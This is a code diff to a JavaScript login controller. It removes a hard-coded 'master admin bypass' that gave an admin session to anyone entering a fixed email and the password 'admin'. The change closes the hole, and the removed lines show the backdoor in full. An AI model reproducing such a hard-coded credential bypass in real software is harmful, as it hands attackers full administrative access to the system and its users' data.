@@ -183,20 +183,7 @@ const authController = {
                 return res.redirect('/login');
             }
 
-            // Master admin bypass
-            if (email === 'admin@gmail.com' && password === 'admin') {
-                req.session.user = {
-                    id: 1,
-                    name: 'Super Admin',
-                    email: 'admin@gmail.com',
-                    role: 'admin',
-                    is_vip: true,
-                    nova_coins: 0,
-                    user_code: 'PN-623164'
-                };
-                req.flash('success', 'Admin Bypass Login Successful!');
-                return res.redirect('/admin');
-            }
+
 
             // Find user
             const user = await User.findByEmail(email);
